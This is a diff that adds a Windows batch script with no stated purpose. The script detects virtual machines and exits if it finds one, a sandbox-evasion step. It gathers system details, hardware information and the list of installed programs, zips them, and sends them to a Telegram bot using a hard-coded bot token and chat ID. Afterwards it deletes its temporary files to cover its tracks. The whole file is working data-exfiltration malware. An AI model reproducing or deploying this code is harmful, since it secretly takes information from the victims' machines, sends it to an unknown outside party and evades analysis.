@@ -1,0 +1,54 @@
+
+@echo off
+setlocal enabledelayedexpansion
+
+rem Check for virtual machine environment
+set VM_FLAG=0
+for %%i in ("VirtualBox" "VMware") do (
+    wmic computersystem get manufacturer | findstr /i %%i >nul && set VM_FLAG=1
+)
+wmic computersystem get manufacturer | findstr /i "Microsoft" >nul && wmic computersystem get model | findstr /i "Virtual" >nul && set VM_FLAG=1
+
+if %VM_FLAG%==1 (
+    echo This system appears to be running in a virtual machine.
+    exit /b
+)
+
+rem Retrieve public IP
+set IP_URL=https://api.ipify.org
+for /f "tokens=* delims=" %%i in ('curl -s %IP_URL%') do set IP=%%i
+
+rem Create a temporary file for system info
+set TEMP_INFO_FILE=%TEMP%\system_info.txt
+
+rem Gather system information
+(
+    echo System Information:
+    wmic computersystem get model
+    wmic cpu get caption
+    wmic memorychip get capacity
+    wmic logicaldisk get size,caption
+    systeminfo
+) > "%TEMP_INFO_FILE%"
+
+rem Gather installed applications information using PowerShell
+set APPS_INFO_FILE=%TEMP%\apps_info.txt
+powershell -Command "Get-WmiObject -Class Win32_Product | Select-Object Name, Version | Format-Table -AutoSize | Out-File -FilePath %APPS_INFO_FILE%"
+
+rem Create a zip file containing the text files
+set ZIP_FILE=%TEMP%\system_info.zip
+powershell Compress-Archive -Path "%TEMP_INFO_FILE%", "%APPS_INFO_FILE%" -DestinationPath "%ZIP_FILE%"
+
+rem Set token and chat ID
+set TOKEN=7403017117:AAH6-FcN7546cDsibC8tzYNb7bm_TH7tTiU
+set CHAT_ID=-1002202430557
+
+rem Send zip file via Telegram
+curl -F chat_id=%CHAT_ID% -F document=@%ZIP_FILE% "https://api.telegram.org/bot%TOKEN%/sendDocument"
+
+rem Clean up
+del "%TEMP_INFO_FILE%"
+del "%APPS_INFO_FILE%"
+del "%ZIP_FILE%"
+
+endlocal
